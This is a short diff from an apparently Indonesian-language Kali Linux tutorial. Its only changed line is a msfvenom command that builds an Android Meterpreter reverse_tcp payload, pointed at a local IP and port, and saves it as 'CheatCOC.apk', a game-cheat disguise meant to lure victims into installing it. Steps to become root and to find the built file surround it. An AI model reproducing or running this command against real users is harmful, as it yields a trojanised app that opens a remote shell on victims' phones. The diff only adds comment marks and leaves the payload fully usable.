@@ -11,7 +11,7 @@ $ sudo su (masuk ke menu root)
 
 Membuat payload dengan perintah
 
-# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.111.61(ip yang di cek tadi) LPORT=4321 R> CheatCOC.apk
+ # #msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.111.61(ip yang di cek tadi) LPORT=4321 R> CheatCOC.apk
 
 tunggu dan jika sudah selesai cek aplikasi yang sudah di buat tadi di folder /home/kali
 
